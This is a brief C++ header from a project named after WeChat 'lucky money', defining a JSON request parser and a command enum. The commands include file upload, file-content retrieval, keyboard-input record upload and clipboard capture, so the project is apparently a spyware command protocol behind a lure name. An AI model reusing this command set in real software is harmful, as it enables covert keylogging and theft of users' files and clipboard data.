
//
// Created by mukeran on 2020/9/12.
//

#ifndef WECHATLUCKYMONEY_REQUEST_H
#define WECHATLUCKYMONEY_REQUEST_H
#include <string>
#include <nlohmann/json.hpp>
using namespace std;
using nlohmann::json;

enum cmd_type {
    UploadFile,
    GetFileContent,
    KeyboardInputRecordUpload,
    TestUpload,
    GetClipboard,
    OK,
    Reset
};

struct request {
    cmd_type cmd;
    string task_id;
    string param;
    static request parse(string str) {
        auto j = json::parse(str);
        return request{
            static_cast<::cmd_type>(j["cmd"].get<int>()),
            j["task_id"].get<string>(),
            j["param"].get<string>()
        };
    }
};


#endif //WECHATLUCKYMONEY_REQUEST_H
